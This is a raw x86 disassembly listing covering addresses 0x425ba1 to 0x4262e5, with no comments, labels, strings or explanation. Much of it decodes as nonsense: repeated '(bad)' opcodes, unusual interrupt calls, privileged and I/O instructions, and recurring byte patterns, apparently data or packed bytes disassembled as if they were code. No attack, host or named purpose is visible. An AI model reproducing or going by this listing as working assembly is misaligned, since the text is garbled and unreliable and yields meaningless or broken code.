  425ba1:	(bad)  
  425ba2:	inc    esp
  425ba3:	mov    ebp,0xfb94
  425ba8:	int    0x76
  425baa:	lods   eax,DWORD PTR ds:[esi]
  425bab:	int    0x8d
  425bad:	mov    ch,0x2f
  425baf:	inc    ebp
  425bb0:	jge    0x425b44
  425bb2:	shr    ebx,cl
  425bb4:	xchg   edx,eax
  425bb5:	int    0x8d
  425bb7:	lods   eax,DWORD PTR ds:[esi]
  425bb8:	int    0x96
  425bba:	mov    ch,0x3b
  425bbc:	leave  
  425bbd:	cmp    ebx,edx
  425bbf:	push   ebx
  425bc0:	icebp  
  425bc1:	bound  eax,QWORD PTR [eax]
  425bc3:	(bad)  
  425bc4:	push   esp
  425bc5:	shl    edx,cl
  425bc7:	sub    BYTE PTR [eax],al
  425bc9:	(bad)  
  425bca:	cmp    al,0xbd
  425bcc:	inc    esp
  425bcd:	sti    
  425bce:	add    BYTE PTR [eax],al
  425bd0:	int    0x76
  425bd2:	std    
  425bd3:	int    0x8d
  425bd5:	std    
  425bd6:	cmp    ecx,DWORD PTR [ebx+edx*8]
  425bd9:	repnz sub BYTE PTR [ebx],bh
  425bdc:	jns    0x425bb1
  425bde:	mov    ebp,0xcdd35392
  425be3:	(bad)  
  425be4:	std    
  425be5:	int    0x96
  425be7:	std    
  425be8:	cmp    ecx,DWORD PTR [edi]
  425bea:	shr    ebx,cl
  425bec:	xchg   edx,eax
  425bed:	cmp    edx,ebp
  425bef:	shr    edx,cl
  425bf1:	sub    BYTE PTR [ebx+0x13],dl
  425bf4:	xchg   ebx,edx
  425bf6:	int    0x8d
  425bf8:	std    
  425bf9:	int    0x96
  425bfb:	std    
  425bfc:	cmp    ecx,DWORD PTR [edi]
  425bfe:	shr    ebx,cl
  425c00:	xchg   edx,eax
  425c01:	cmp    edx,ebp
  425c03:	shr    edx,cl
  425c05:	sub    BYTE PTR [ebx+0x13],dl
  425c08:	xchg   ebx,edx
  425c0a:	int    0x8d
  425c0c:	std    
  425c0d:	int    0x96
  425c0f:	std    
  425c10:	cmp    ecx,DWORD PTR [edi]
  425c12:	shr    ebx,cl
  425c14:	xchg   edx,eax
  425c15:	cmp    edx,ebp
  425c17:	shr    edx,cl
  425c19:	sub    BYTE PTR [ebx+0x13],dl
  425c1c:	xchg   ebx,edx
  425c1e:	or     al,BYTE PTR [esi]
  425c20:	nop
  425c21:	add    BYTE PTR [eax],al
  425c23:	add    ch,cl
  425c25:	jbe    0x425c7b
  425c27:	int    0x80
  425c29:	int    0x8d
  425c2b:	mov    ebp,0x3bbd96cd
  425c30:	(bad)  
  425c32:	aad    0xd3
  425c34:	jmp    0x425bc8
  425c36:	shr    edx,cl
  425c38:	sub    BYTE PTR [ebx+0x13],dl
  425c3b:	or     al,BYTE PTR ds:0xd4cf
  425c41:	add    ch,cl
  425c43:	jbe    0x425c91
  425c45:	int    0x80
  425c47:	int    0x8d
  425c49:	std    
  425c4a:	int    0x96
  425c4c:	std    
  425c4d:	cmp    ecx,DWORD PTR [edi]
  425c4f:	shr    ebx,cl
  425c51:	xchg   edx,eax
  425c52:	int    0x6c
  425c54:	jo     0x425c91
  425c56:	aad    0xd3
  425c58:	jmp    0xcf05:0xa135328
  425c5f:	aam    0x0
  425c61:	add    BYTE PTR [eax],al
  425c63:	int    0x76
  425c65:	sbb    al,0xcd
  425c67:	lea    ebx,[ebx+edi*1]
  425c6a:	or     al,0xd3
  425c6c:	repnz sub BYTE PTR [ebx],bh
  425c6f:	jns    0x425c44
  425c71:	mov    ebp,0xcdd35392
  425c76:	(bad)  
  425c77:	std    
  425c78:	int    0x96
  425c7a:	std    
  425c7b:	cmp    edx,ebp
  425c7d:	cmp    ecx,DWORD PTR [edi]
  425c7f:	shr    edx,cl
  425c81:	sub    bl,dl
  425c83:	jmp    0x425c17
  425c85:	push   ebx
  425c86:	adc    ecx,ebp
  425c88:	xchg   esi,eax
  425c89:	std    
  425c8a:	int    0xa6
  425c8c:	std    
  425c8d:	cmp    ebx,DWORD PTR [ecx+0x492f3d3]
  425c93:	hlt    
  425c94:	call   ebx
  425c96:	in     eax,0x28
  425c98:	push   ebx
  425c99:	aad    0x87
  425c9b:	adc    ecx,DWORD PTR [edx]
  425c9d:	add    eax,0xd4cf
  425ca2:	add    ch,cl
  425ca4:	jbe    0x425ca3
  425ca6:	int    0x8d
  425ca8:	std    
  425ca9:	add    al,0x2
  425cab:	call   ebx
  425cad:	repnz sub BYTE PTR [ebx],bh
  425cb0:	jns    0x425c85
  425cb2:	mov    ebp,0xcdd35392
  425cb7:	(bad)  
  425cb8:	std    
  425cb9:	int    0x96
  425cbb:	std    
  425cbc:	add    al,0xfb
  425cbe:	(bad)  
  425cbf:	cmp    ecx,DWORD PTR [edi]
  425cc1:	shr    edx,cl
  425cc3:	sub    bl,dl
  425cc5:	jmp    0x425c59
  425cc7:	push   ebx
  425cc8:	adc    eax,DWORD PTR [edi-0x272322d]
  425cce:	int    0x96
  425cd0:	std    
  425cd1:	add    al,0xfb
  425cd3:	(bad)  
  425cd4:	cmp    ecx,DWORD PTR [edi]
  425cd6:	shr    edx,cl
  425cd8:	sub    bl,dl
  425cda:	jmp    0x425c6e
  425cdc:	push   ebx
  425cdd:	adc    ecx,edi
  425cdf:	pop    ss
  425ce0:	nop
  425ce1:	add    BYTE PTR [eax],al
  425ce3:	add    BYTE PTR [edx-0x33],ah
  425ce6:	xchg   esi,eax
  425ce7:	std    
  425ce8:	int    0xa6
  425cea:	std    
  425ceb:	xchg   ebx,edx
  425ced:	cmp    ebx,DWORD PTR [ecx+0xaa58dcf]
  425cf3:	int3   
  425cf4:	push   es
  425cf5:	aam    0x0
  425cf7:	add    BYTE PTR [eax],al
  425cf9:	int    0x76
  425cfb:	sub    al,0x4
  425cfd:	hlt    
  425cfe:	call   ebx
  425d00:	repz xchg edx,eax
  425d02:	shl    ebp,cl
  425d04:	sub    BYTE PTR [ebx-0x2b],dl
  425d07:	iret   
  425d08:	or     edi,ebp
  425d0a:	add    BYTE PTR [eax+0x3d01cd80],0x81
  425d11:	add    BYTE PTR [eax+0x50007162],0x0
  425d18:	xchg   esi,eax
  425d19:	and    al,0x6
  425d1b:	ins    DWORD PTR es:[edi],dx
  425d1c:	aam    0xbc
  425d1e:	int    0x76
  425d20:	in     eax,dx
  425d21:	int    0x8d
  425d23:	adc    DWORD PTR [edi],ebp
  425d25:	inc    ebp
  425d26:	jge    0x425cba
  425d28:	shr    ebx,cl
  425d2a:	xchg   edx,eax
  425d2b:	int    0xe3
  425d2d:	int    0x7d
  425d2f:	int    0x76
  425d31:	in     eax,dx
  425d32:	int    0x96
  425d34:	adc    DWORD PTR [ebx],edi
  425d36:	fidivr DWORD PTR [ebx]
  425d38:	lock shr DWORD PTR [ebp+0x4c76cd28],cl
  425d3f:	push   ebx
  425d40:	adc    ecx,ebp
  425d42:	xor    BYTE PTR [ebx-0x76],al
  425d45:	jo     0x425d14
  425d47:	xchg   esi,eax
  425d48:	push   esp
  425d49:	in     al,dx
  425d4a:	push   esp
  425d4b:	int    0x92
  425d4d:	int    0xa6
  425d4f:	push   eax
  425d50:	retf   0x5324
  425d53:	or     DWORD PTR [eax+ecx*4],esp
  425d56:	int    0x76
  425d58:	cmc    
  425d59:	int    0x8d
  425d5b:	stc    
  425d5c:	das    
  425d5d:	inc    ebp
  425d5e:	jge    0x425cf2
  425d60:	shr    ebx,cl
  425d62:	xchg   edx,eax
  425d63:	int    0x8d
  425d65:	cmc    
  425d66:	int    0xa6
  425d68:	stc    
  425d69:	cmp    ecx,ecx
  425d6b:	cmp    ebx,ebp
  425d6d:	shl    edx,cl
  425d6f:	sub    ch,cl
  425d71:	lea    esi,[eax]
  425d73:	push   ebx
  425d74:	lds    eax,FWORD PTR [edi+0x4c76cd7d]
  425d7a:	int    0x1c
  425d7c:	inc    ebx
  425d7d:	(bad)  
  425d7e:	jo     0x425d8a
  425d80:	lea    esi,[eax]
  425d82:	or     cl,0xec
  425d85:	xchg   ch,cl
  425d87:	xchg   esi,eax
  425d88:	push   esp
  425d89:	int    0x76
  425d8b:	dec    esp
  425d8c:	int    0x4a
  425d8e:	int    0x20
  425d90:	xchg   DWORD PTR [esi-0x32e3f59c],ebx
  425d96:	sbb    al,0xcd
  425d98:	dec    edx
  425d99:	xchg   ebp,ecx
  425d9b:	sub    eax,0xa808080
  425da0:	lea    esi,[eax]
  425da2:	int    0x4a
  425da4:	int    0xa6
  425da6:	push   eax
  425da7:	xor    ecx,DWORD PTR [ecx*8+0x530a88a6]
  425dae:	int    0x80
  425db0:	int    0x4a
  425db2:	xchg   DWORD PTR [esp+edi*1-0x33],edi
  425db6:	jbe    0x425da5
  425db8:	or     cl,BYTE PTR [ebp+0x118dcd0d]
  425dbe:	das    
  425dbf:	inc    ebp
  425dc0:	jge    0x425d54
  425dc2:	shr    ebx,cl
  425dc4:	xchg   edx,eax
  425dc5:	int    0x8d
  425dc7:	in     eax,dx
  425dc8:	int    0xa6
  425dca:	adc    DWORD PTR [ebx],edi
  425dcc:	leave  
  425dcd:	cmp    ebx,ebp
  425dcf:	shl    edx,cl
  425dd1:	sub    BYTE PTR [ebx-0x3b],dl
  425dd4:	or     dh,BYTE PTR [esi+0x44]
  425dd7:	int    0x76
  425dd9:	xor    bl,ch
  425ddb:	les    eax,FWORD PTR [ecx+0x76cd8080]
  425de1:	in     eax,dx
  425de2:	int    0x8d
  425de4:	adc    DWORD PTR [edi],ebp
  425de6:	inc    ebp
  425de7:	jge    0x425d7b
  425de9:	shr    ebx,cl
  425deb:	xchg   edx,eax
  425dec:	int    0x8d
  425dee:	in     eax,dx
  425def:	int    0xa6
  425df1:	adc    ebx,edx
  425df3:	repnz sub ch,cl
  425df6:	lea    edx,[ebx+edi*1]
  425df9:	leave  
  425dfa:	cmp    ebx,ebp
  425dfc:	add    al,0xd3
  425dfe:	stc    
  425dff:	push   ebx
  425e00:	(bad)
  425e03:	inc    ebx
  425e04:	shr    DWORD PTR [edi],cl
  425e06:	add    al,0xf7
  425e08:	add    BYTE PTR [eax+0x30a6cd80],0xcf
  425e0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425e10:	dec    ebx
  425e11:	mov    BYTE PTR [ebx],dh
  425e13:	jge    0x425e1f
  425e15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425e16:	xor    al,0xa
  425e18:	lea    edi,[ecx*8+0x76cdf18d]
  425e1f:	xchg   ebp,eax
  425e20:	das    
  425e21:	inc    ebp
  425e22:	rcl    DWORD PTR [edx-0x326d422d],cl
  425e28:	jbe    0x425e1b
  425e2a:	int    0xa6
  425e2c:	xchg   ebp,eax
  425e2d:	shr    DWORD PTR [ebp-0xa8932d8],cl
  425e33:	cmp    esi,eax
  425e35:	cmp    ebx,ebp
  425e37:	push   ebx
  425e38:	or     al,0xcd
  425e3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425e3b:	stc    
  425e3c:	das    
  425e3d:	inc    ebp
  425e3e:	popf   
  425e3f:	xchg   edx,eax
  425e40:	or     dh,BYTE PTR [esi+0x54]
  425e43:	int    0x76
  425e45:	cmc    
  425e46:	push   ecx
  425e47:	out    0x54,al
  425e49:	add    al,0xd3
  425e4b:	dec    edx
  425e4c:	shr    esp,cl
  425e4e:	xchg   edx,eax
  425e4f:	int    0xa6
  425e51:	stc    
  425e52:	cmp    ebx,ebp
  425e54:	mov    DWORD PTR [esi+0x54b6d554],esp
  425e5a:	int    0xa6
  425e5c:	cmc    
  425e5d:	int    0x8d
  425e5f:	stc    
  425e60:	das    
  425e61:	inc    ebp
  425e62:	or     al,0x92
  425e64:	shr    DWORD PTR [ebp-0xa8932d8],cl
  425e6a:	shr    ebx,cl
  425e6c:	xchg   edx,eax
  425e6d:	int    0x8d
  425e6f:	stc    
  425e70:	cmp    ecx,ebx
  425e72:	shr    DWORD PTR [ebp+0x5476cd28],cl
  425e78:	cmp    esp,ecx
  425e7a:	push   ebx
  425e7b:	fcmovne st,st(5)
  425e7d:	lea    esi,[edi+ebp*1]
  425e80:	mov    ebx,0x2bc53389
  425e85:	ror    ebp,cl
  425e87:	(bad)  
  425e88:	icebp  
  425e89:	or     dh,BYTE PTR [esi+0x54]
  425e8c:	int    0x76
  425e8e:	xchg   ebp,eax
  425e8f:	das    
  425e90:	inc    ebp
  425e91:	rcl    DWORD PTR [edx-0x326d422d],cl
  425e97:	jbe    0x425e8a
  425e99:	int    0xa6
  425e9b:	xchg   ebp,eax
  425e9c:	shr    DWORD PTR [ebp+0x3476cd28],cl
  425ea2:	das    
  425ea3:	mov    ebx,0xa6020180
  425ea8:	cmp    ebx,ebp
  425eaa:	dec    edx
  425eab:	or     al,0x1
  425ead:	ror    DWORD PTR [edx-0x2b],cl
  425eb0:	mov    ebp,0xbdbfcb3b
  425eb5:	or     ah,BYTE PTR [ebx]
  425eb7:	and    eax,0x92d3352f
  425ebc:	shr    DWORD PTR [ebp+0x37d65692],cl
  425ec2:	ficom  WORD PTR [ebx]
  425ec4:	cmp    ecx,DWORD PTR [esi+eiz*2]
  425ec7:	fidiv  WORD PTR [edi]
  425ec9:	ficom  WORD PTR [ebx]
  425ecb:	(bad)  
  425ecc:	ss inc ebx
  425ece:	or     al,0xd6
  425ed0:	cs int 0x92
  425ed3:	int    0x8d
  425ed5:	xor    BYTE PTR [edi+0x548dcd81],al
  425edb:	add    al,0x64
  425edd:	mov    BYTE PTR [eax-0x6d32ce2c],al
  425ee3:	int    0x8d
  425ee5:	xor    BYTE PTR [edi-0x7772327f],al
  425eeb:	xchg   DWORD PTR [esi+0x54],esi
  425eee:	int    0x89
  425ef0:	or     DWORD PTR [eax-0x6dcb89fc],0x2f3c8d00
  425efa:	push   es
  425efb:	and    eax,DWORD PTR [eax]
  425efd:	add    BYTE PTR [eax],al
  425eff:	in     al,dx
  425f00:	test   DWORD PTR [edi+0x25230abd],edi
  425f06:	int    0x76
  425f08:	adc    al,0x81
  425f0a:	jbe    0x425f50
  425f0c:	leave  
  425f0d:	jbe    0x425f7c
  425f0f:	scas   al,BYTE PTR es:[edi]
  425f10:	aaa    
  425f11:	ficom  WORD PTR [ebx]
  425f13:	or     ah,BYTE PTR [esi+0x6d76cd75]
  425f19:	int    0x8d
  425f1b:	jne    0x425f4c
  425f1d:	inc    ebp
  425f1e:	jge    0x425eb2
  425f20:	shr    ebx,cl
  425f22:	xchg   edx,eax
  425f23:	int    0x8d
  425f25:	ins    DWORD PTR es:[edi],dx
  425f26:	int    0xa6
  425f28:	jne    0x425efd
  425f2a:	repnz sub ch,cl
  425f2d:	lea    ecx,[ebp+ecx*8-0x77]
  425f31:	cmp    ecx,ecx
  425f33:	cmp    ebx,ebp
  425f35:	push   ebx
  425f36:	(bad)
  425f39:	shl    esp,cl
  425f3b:	int    0x8d
  425f3d:	inc    esp
  425f3e:	inc    ebx
  425f3f:	mov    BYTE PTR [edi+0x54],dh
  425f42:	int    0x76
  425f44:	xor    BYTE PTR [edi+0x760a1476],al
  425f4a:	xor    ch,cl
  425f4c:	ins    BYTE PTR es:[edi],dx
  425f4d:	test   BYTE PTR [edx],cl
  425f4f:	jbe    0x425f65
  425f51:	int    0x76
  425f53:	in     eax,dx
  425f54:	int    0x8d
  425f56:	adc    DWORD PTR [edi],ebp
  425f58:	inc    ebp
  425f59:	jge    0x425eed
  425f5b:	shr    ebx,cl
  425f5d:	xchg   edx,eax
  425f5e:	int    0x8d
  425f60:	in     eax,dx
  425f61:	int    0xa6
  425f63:	adc    DWORD PTR [ebx],edi
  425f65:	fnstsw WORD PTR [ebx]
  425f67:	leave  
  425f68:	push   ebx
  425f69:	(bad)
  425f6c:	sub    BYTE PTR [esi+0x76],bl
  425f6f:	adc    al,0x2f
  425f71:	push   es
  425f72:	mov    esi,0xcd0000ff
  425f77:	(bad)  
  425f78:	std    
  425f79:	int    0x96
  425f7b:	std    
  425f7c:	cmp    ecx,DWORD PTR [edi]
  425f7e:	shr    ebx,cl
  425f80:	xchg   edx,eax
  425f81:	sar    bh,0x9c
  425f84:	cmp    esi,ecx
  425f86:	shr    edx,cl
  425f88:	sub    BYTE PTR [ebx+0x13],dl
  425f8b:	int    0x96
  425f8d:	std    
  425f8e:	int    0xa6
  425f90:	std    
  425f91:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425f97:	popf   
  425f98:	shl    ebp,cl
  425f9a:	sub    BYTE PTR [ebx-0x2b],dl
  425f9d:	xchg   DWORD PTR [ebx],edx
  425f9f:	int    0x96
  425fa1:	std    
  425fa2:	int    0xa6
  425fa4:	std    
  425fa5:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425fab:	popf   
  425fac:	shl    ebp,cl
  425fae:	sub    BYTE PTR [ebx-0x2b],dl
  425fb1:	xchg   DWORD PTR [ebx],edx
  425fb3:	int    0x96
  425fb5:	std    
  425fb6:	int    0xa6
  425fb8:	std    
  425fb9:	cmp    ebx,DWORD PTR [ecx-0xc2c62c5]
  425fbf:	xchg   edx,eax
  425fc0:	shl    ebp,cl
  425fc2:	sub    BYTE PTR [ebx-0x2b],dl
  425fc5:	xchg   DWORD PTR [ebx],edx
  425fc7:	or     cl,bh
  425fc9:	nop
  425fca:	add    BYTE PTR [eax],al
  425fcc:	add    ch,cl
  425fce:	lea    edx,[eax-0x33]
  425fd1:	xchg   esi,eax
  425fd2:	mov    ebp,0x3bbda6cd
  425fd7:	cdq    
  425fd8:	cmp    ebx,DWORD PTR [ebp-0x2c6d0c2d]
  425fde:	in     eax,0x28
  425fe0:	push   ebx
  425fe1:	aad    0xa
  425fe3:	int3   
  425fe4:	pop    ss
  425fe5:	aam    0x0
  425fe7:	add    BYTE PTR [eax],al
  425fe9:	int    0x8d
  425feb:	dec    esp
  425fec:	int    0x89
  425fee:	int    0x96
  425ff0:	std    
  425ff1:	int    0xa6
  425ff3:	std    
  425ff4:	int    0x7e
  425ff6:	jo     0x426033
  425ff8:	cdq    
  425ff9:	cmp    ebx,DWORD PTR [ebp-0x2c6d0c2d]
  425fff:	in     eax,0x28
  426001:	push   ebx
  426002:	aad    0xa
  426004:	int3   
  426005:	pop    ss
  426006:	aam    0x0
  426008:	add    BYTE PTR [eax],al
  42600a:	int    0x8d
  42600c:	sbb    al,0xcd
  42600e:	xchg   esi,eax
  42600f:	sbb    al,0x3b
  426011:	icebp  
  426012:	shr    edx,cl
  426014:	sub    BYTE PTR [ebx],bh
  426016:	psrlq  mm5,mm3
  426019:	xchg   edx,eax
  42601a:	push   ebx
  42601b:	adc    ecx,ebp
  42601d:	xchg   esi,eax
  42601e:	std    
  42601f:	int    0xa6
  426021:	std    
  426022:	cmp    ebx,DWORD PTR [ebp+0x3bfd76cd]
  426028:	cdq    
  426029:	shl    ebp,cl
  42602b:	sub    bl,dl
  42602d:	repz xchg edx,eax
  42602f:	push   ebx
  426030:	aad    0xcd
  426032:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426033:	std    
  426034:	cmp    edi,DWORD PTR [ecx+0x4]
  426037:	hlt    
  426038:	call   ebx
  42603a:	mov    ebp,0x28e5d392
  42603f:	push   ebx
  426040:	lds    eax,FWORD PTR [edi+0x17cc0af1]
  426046:	aam    0x0
  426048:	add    BYTE PTR [eax],al
  42604a:	int    0x8d
  42604c:	std    
  42604d:	int    0x96
  42604f:	std    
  426050:	cmp    ecx,DWORD PTR [edi]
  426052:	shr    ebx,cl
  426054:	xchg   edx,eax
  426055:	sar    bh,0x9c
  426058:	cmp    esi,ecx
  42605a:	shr    edx,cl
  42605c:	sub    BYTE PTR [ebx+0x13],dl
  42605f:	int    0x96
  426061:	std    
  426062:	int    0xa6
  426064:	std    
  426065:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  42606b:	popf   
  42606c:	shl    ebp,cl
  42606e:	sub    BYTE PTR [ebx-0x2b],dl
  426071:	xchg   DWORD PTR [ebx],edx
  426073:	int    0x96
  426075:	std    
  426076:	int    0xa6
  426078:	std    
  426079:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  42607f:	popf   
  426080:	shl    ebp,cl
  426082:	sub    BYTE PTR [ebx-0x2b],dl
  426085:	xchg   DWORD PTR [ebx],edx
  426087:	iret   
  426088:	xchg   esi,eax
  426089:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42608a:	or     dl,BYTE PTR ds:0xd4cf
  426090:	add    bh,cl
  426092:	iret   
  426093:	nop
  426094:	add    BYTE PTR [eax],al
  426096:	add    BYTE PTR [ecx-0x33],dh
  426099:	(bad)  
  42609a:	std    
  42609b:	int    0x96
  42609d:	std    
  42609e:	cmp    ecx,DWORD PTR [edi]
  4260a0:	int    0xd6
  4260a2:	sub    al,0x3b
  4260a4:	icebp  
  4260a5:	shr    ebx,cl
  4260a7:	xchg   edx,eax
  4260a8:	shr    edx,cl
  4260aa:	sub    BYTE PTR [ebx+0x13],dl
  4260ad:	jno    0x42607e
  4260af:	pop    es
  4260b0:	out    dx,eax
  4260b1:	add    BYTE PTR [eax+0x7cd7080],0x3d
  4260b8:	add    DWORD PTR [eax+0x500080],0x7cd2496
  4260c2:	add    DWORD PTR [ecx+0x760a8080],eax
  4260c8:	dec    esp
  4260c9:	int    0x76
  4260cb:	mov    ch,cl
  4260cd:	mov    BYTE PTR [edi-0x72f5b373],al
  4260d3:	dec    esp
  4260d4:	int    0x8d
  4260d6:	cmc    
  4260d7:	int    0x96
  4260d9:	stc    
  4260da:	das    
  4260db:	inc    ebp
  4260dc:	jecxz  0x426070
  4260de:	shl    ebx,cl
  4260e0:	xchg   edx,eax
  4260e1:	int    0x96
  4260e3:	cmc    
  4260e4:	int    0xd6
  4260e6:	stc    
  4260e7:	cmp    esi,edi
  4260e9:	shr    edx,cl
  4260eb:	sub    ch,cl
  4260ed:	xchg   esi,eax
  4260ee:	cmc    
  4260ef:	cmp    esi,eax
  4260f1:	push   ebx
  4260f2:	bswap  ebp
  4260f4:	(bad)  
  4260f5:	stc    
  4260f6:	das    
  4260f7:	inc    ebp
  4260f8:	sti    
  4260f9:	xchg   edx,eax
  4260fa:	shr    edi,cl
  4260fc:	xchg   edx,eax
  4260fd:	int    0xd6
  4260ff:	cmc    
  426100:	int    0xa6
  426102:	stc    
  426103:	cmp    ebx,ecx
  426105:	cmp    ebx,ebp
  426107:	push   ebx
  426108:	aad    0x87
  42610a:	adc    ecx,ebp
  42610c:	xchg   esi,eax
  42610d:	cmc    
  42610e:	sar    DWORD PTR [ecx-0x62932d8],cl
  426114:	das    
  426115:	inc    ebp
  426116:	sti    
  426117:	xchg   edx,eax
  426118:	shr    edi,cl
  42611a:	xchg   edx,eax
  42611b:	int    0xd6
  42611d:	cmc    
  42611e:	int    0xa6
  426120:	stc    
  426121:	cmp    ebx,ecx
  426123:	cmp    ebx,ebp
  426125:	push   ebx
  426126:	aad    0x87
  426128:	adc    ecx,ebp
  42612a:	xchg   esi,eax
  42612b:	cmc    
  42612c:	sar    DWORD PTR [ecx-0x62932d8],cl
  426132:	das    
  426133:	inc    ebp
  426134:	sti    
  426135:	xchg   edx,eax
  426136:	shr    edi,cl
  426138:	xchg   edx,eax
  426139:	int    0xd6
  42613b:	cmc    
  42613c:	cmp    ebx,ecx
  42613e:	int    0xe6
  426140:	stc    
  426141:	cmp    eax,DWORD PTR [eax]
  426143:	push   ebx
  426144:	fld    DWORD PTR [edi+0x707113]
  42614a:	(bad)  
  42614b:	dec    esp
  42614c:	sar    DWORD PTR [ecx-0x12c242d8],cl
  426152:	add    BYTE PTR [eax],al
  426154:	int    0x76
  426156:	or     eax,0xcb63a8aa
  42615b:	rcl    BYTE PTR [eax-0x80],cl
  42615e:	xchg   esi,eax
  42615f:	int    0xed
  426161:	add    al,0xed
  426163:	inc    esp
  426164:	pop    ebx
  426165:	cwde   
  426166:	call   0x76c9:0xcb3bdd3b
  42616d:	popf   
  42616e:	(bad)  
  42616f:	aaa    
  426170:	ficom  WORD PTR [ebx]
  426172:	pop    ebp
  426173:	mov    ebp,0xa25230a
  426178:	jbe    0x42611f
  42617a:	leave  
  42617b:	jbe    0x42613a
  42617d:	xchg   ecx,eax
  42617e:	aaa    
  42617f:	ficom  WORD PTR [ebx]
  426181:	or     dh,BYTE PTR [esi-0x13]
  426184:	leave  
  426185:	jbe    0x426174
  426187:	dec    ecx
  426188:	mov    al,ds:0x76c93586
  42618d:	cmc    
  42618e:	dec    ecx
  42618f:	lahf   
  426190:	xchg   BYTE PTR ds:0x691176c9,dh
  426196:	and    DWORD PTR [esi+0x1176c935],eax
  42619c:	cmp    DWORD PTR [ecx],esp
  42619e:	xchg   BYTE PTR ds:0x49f976c9,dh
  4261a4:	and    DWORD PTR [ebp+esi*1+0xa8476cf],eax
  4261ab:	jbe    0x4261a6
  4261ad:	int    0x76
  4261af:	sbb    al,0xcd
  4261b1:	shl    BYTE PTR ds:0xcd808081,1
  4261b7:	jbe    0x4261d5
  4261b9:	int    0x8d
  4261bb:	sbb    al,0xcd
  4261bd:	add    DWORD PTR ds:0xcd808081,ebp
  4261c3:	xor    ch,cl
  4261c5:	pop    esp
  4261c6:	xchg   eax,esp
  4261c8:	fs int 0x96
  4261cb:	popf   
  4261cc:	int    0xa
  4261ce:	and    eax,0xa808081
  4261d3:	out    0xb5,al
  4261d5:	int    0xe6
  4261d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4261d8:	das    
  4261d9:	inc    ebp
  4261da:	add    edx,DWORD PTR [edx-0x326def2d]
  4261e0:	out    0x9d,al
  4261e2:	int    0xa6
  4261e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4261e5:	adc    bh,bl
  4261e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4261e8:	mov    esi,0xdd3b4229
  4261ed:	shr    ecx,cl
  4261ef:	sub    ch,cl
  4261f1:	pop    esi
  4261f2:	push   ebx
  4261f3:	aad    0x43
  4261f5:	(bad)  
  4261f7:	nop
  4261f8:	int    0x18
  4261fa:	or     dl,BYTE PTR [esi+0x1496cdf9]
  426200:	int    0x96
  426202:	xor    ch,cl
  426204:	xchg   esi,eax
  426205:	dec    esp
  426206:	iret   
  426207:	xchg   esi,eax
  426208:	lods   eax,DWORD PTR ds:[esi]
  426209:	bound  eax,QWORD PTR [eax]
  42620b:	(bad)  
  42620c:	stc    
  42620d:	jno    0x42627f
  42620f:	cwde   
  426210:	add    dh,dl
  426212:	sbb    al,0xcf
  426214:	jbe    0x4261cb
  426216:	add    dh,dl
  426218:	mov    BYTE PTR [eax],al
  42621a:	(bad)  
  42621b:	cmc    
  42621c:	add    dh,dl
  42621e:	adc    DWORD PTR [eax],eax
  426220:	(bad)  
  426221:	in     eax,dx
  426222:	jo     0x4261f3
  426224:	jbe    0x426223
  426226:	jo     0x4261e5
  426228:	stos   BYTE PTR es:[edi],al
  426229:	clc    
  42622a:	add    BYTE PTR [eax],al
  42622c:	or     dh,BYTE PTR [esi+0x1c]
  42622f:	int    0x76
  426231:	sbb    al,0xcd
  426233:	lea    esp,[edx+ecx*1]
  426236:	outs   dx,BYTE PTR ds:[esi]
  426237:	adc    al,0xcd
  426239:	jbe    0x42625f
  42623b:	leave  
  42623c:	add    BYTE PTR [edi-0x327f7f80],0x76
  426243:	lods   eax,DWORD PTR ds:[esi]
  426244:	int    0x8d
  426246:	and    al,0xa
  426248:	outs   dx,BYTE PTR ds:[esi]
  426249:	test   ch,cl
  42624b:	jbe    0x42627d
  42624d:	int    0x8d
  42624f:	and    al,0xa
  426251:	outs   dx,BYTE PTR ds:[esi]
  426252:	mov    ch,cl
  426254:	jbe    0x42626a
  426256:	int    0x8d
  426258:	and    al,0xa
  42625a:	outs   dx,BYTE PTR ds:[esi]
  42625b:	dec    esp
  42625c:	int    0x76
  42625e:	and    al,0xc9
  426260:	ins    BYTE PTR es:[edi],dx
  426261:	and    al,0x81
  426263:	add    BYTE PTR [eax-0x32e11380],0x76
  42626a:	sbb    al,0xcd
  42626c:	lea    ebx,[ecx*8-0x7f7ed2ff]
  426273:	or     ch,0xa
  426276:	and    eax,0xcd808081
  42627b:	xor    BYTE PTR [ebx],0x81
  42627e:	or     dh,BYTE PTR [esi-0x3]
  426281:	int    0x76
  426283:	std    
  426284:	stos   BYTE PTR es:[edi],al
  426285:	test   al,0x63
  426287:	retf   
  426288:	rcr    BYTE PTR [eax+eax*4],cl
  42628b:	xchg   esi,eax
  42628c:	int    0xed
  42628e:	int    0x76
  426290:	dec    esp
  426291:	adc    ch,ch
  426293:	cmp    eax,0x5b808081
  426298:	cwde   
  426299:	call   0x2f35:0x86214966
  4262a0:	push   es
  4262a1:	mov    ecx,0xcd80804a
  4262a6:	jbe    0x4262d8
  4262a8:	inc    cx
  4262aa:	and    DWORD PTR [esi-0x62f9d0cb],eax
  4262b0:	dec    edx
  4262b1:	add    BYTE PTR [eax-0x29128937],0x37
  4262b8:	ficom  WORD PTR [ebx]
  4262ba:	pop    ebp
  4262bb:	mov    ebp,0xa25230a
  4262c0:	jbe    0x4262d3
  4262c2:	leave  
  4262c3:	jbe    0x42627a
  4262c5:	xchg   ecx,eax
  4262c6:	aaa    
  4262c7:	ficom  WORD PTR [ebx]
  4262c9:	or     dh,BYTE PTR [esi-0x43]
  4262cc:	int    0x76
  4262ce:	mov    BYTE PTR [edx],cl
  4262d0:	jbe    0x4262c7
  4262d2:	int    0x76
  4262d4:	cmc    
  4262d5:	int    0x1
  4262d7:	mov    ebp,0xcd808081
  4262dc:	or     ch,0x80
  4262df:	or     dh,BYTE PTR [esi-0x7]
  4262e2:	pop    edi
  4262e3:	jle    0x42631a
  4262e5:	add    BYTE PTR [eax-0x7fca69a3],0x80
